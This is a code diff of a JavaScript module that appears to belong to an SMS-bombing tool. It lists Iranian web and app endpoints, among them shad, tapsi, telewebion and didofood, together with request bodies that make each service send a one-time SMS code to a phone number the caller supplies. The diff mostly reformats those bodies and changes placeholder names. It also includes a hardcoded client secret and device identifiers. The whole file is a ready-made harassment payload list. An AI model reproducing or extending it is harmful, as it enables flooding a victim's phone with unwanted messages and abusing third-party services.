@@ -4,7 +4,14 @@ module.exports = ({ number }) => {
     list = [
         {
             "url": "https://shadmessenger12.iranlms.ir",
-            "data": { "api_version": "3", "method": "sendCode", "data": { "phone_number": `+98${number}`, "send_type": "SMS" } },
+            "data": {
+                "api_version": "3",
+                "method": "sendCode",
+                "data": {
+                    "phone_number": `+98${number}`,
+                    "send_type": "SMS"
+                }
+            },
             "name": "shad",
             "type": "WEB",
             "method": "POST"
@@ -41,7 +48,11 @@ module.exports = ({ number }) => {
         },
         {
             "url": "https://allinco.ir/api/Users/signIn",
-            "data": { "deviceId": "86eb30f27c0b58bb", "hashCode": "Aq1/XpLps/v", "mobile": `0${number}` },
+            "data": {
+                "deviceId": "86eb30f27c0b58bb",
+                "hashCode": "Aq1/XpLps/v",
+                "mobile": `0${number}`
+            },
             "name": "allinco",
             "type": "APK",
             "method": "POST"
@@ -55,28 +66,43 @@ module.exports = ({ number }) => {
         },
         {
             "url": "https://baarbaanet.com/Barbanet/rest/pub/user/otp/send",
-            "data": { "mobile": `0${number}`, "viaSms": true, "viaEmail": false },
+            "data": {
+                "mobile": `0${number}`,
+                "viaSms": true,
+                "viaEmail": false
+            },
             "name": "baarbaanet",
             "type": "WEB",
             "method": "POST"
         },
         {
             "url": "https://bornosmode.com/api/loginRegister/",
-            "data": { mobile: `0${number}`, withOtp: 1 },
+            "data": {
+                mobile: `0${number}`,
+                withOtp: 1
+            },
             "name": "bornosmode",
             "type": "WEB",
             "method": "POST"
         },
         {
             "url": "https://livito.tv/api/oauth/initialize",
-            "data": { "grant_type": "password", "channel": "PASSWORD", "scope": "*", "username": `0${number}` },
+            "data": {
+                "grant_type": "password",
+                "channel": "PASSWORD",
+                "scope": "*",
+                "username": `0${number}`
+            },
             "name": "livito",
             "type": "WEB",
             "method": "POST"
         },
         {
             "url": "https://b2n.ir/lib/phone.php",
-            "data": { "type": "1", "phone": `0${number}` },
+            "data": {
+                "type": "1",
+                "phone": `0${number}`
+            },
             "name": "b2n",
             "type": "WEB",
             "method": "POST"
@@ -97,7 +123,13 @@ module.exports = ({ number }) => {
         },
         {
             "url": "https://api.tapsi.cab/api/v2.2/user",
-            "data": { "credential": { "phoneNumber": `0${number}`, "role": "PASSENGER" }, "otpOption": "SMS" },
+            "data": {
+                "credential": {
+                    "phoneNumber": `0${number}`,
+                    "role": "PASSENGER"
+                },
+                "otpOption": "SMS"
+            },
             "name": "tapsi",
             "type": "WEB",
             "method": "POST"
@@ -152,7 +184,13 @@ module.exports = ({ number }) => {
         // rand mail required
         {
             "url": "https://api2.hitro.mobi/api/passengerinfo/InsertPassenger",
-            "data": { "ClientId": `0${number}`, "ClientSecret": "0501098153736800398716253736091541224", "Name": "awdawd", "Family": "awdawd", "Email": `hawadwdaaw${randomnum}du@gmail.com` },
+            "data": {
+                "ClientId": `0${number}`,
+                "ClientSecret": "0501098153736800398716253736091541224",
+                "Name": "kdccs",
+                "Family": "kdccs",
+                "Email": `kdccs${randomnum}du@gmail.com`
+            },
             "name": "hitro",
             "type": "WEB",
         },
@@ -170,7 +208,10 @@ module.exports = ({ number }) => {
         },
         {
             "url": "https://customer.didofood.co/api/v1/CustomersRegistrations/send_activation_code",
-            "data": { "mobile": `${number}`, "country_id": 1 },
+            "data": {
+                "mobile": `${number}`,
+                "country_id": 1
+            },
             "name": "didofood",
             "type": "WEB",
         },
@@ -223,7 +264,11 @@ module.exports = ({ number }) => {
         },
         {
             "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one",
-            "data": { "code": "98", "phone": `${number}`, "smsStatus": "default" },
+            "data": {
+                "code": "98",
+                "phone": `${number}`,
+                "smsStatus": "default"
+            },
             "name": "telewebion",
             "type": "WEB",
             "method": "POST",
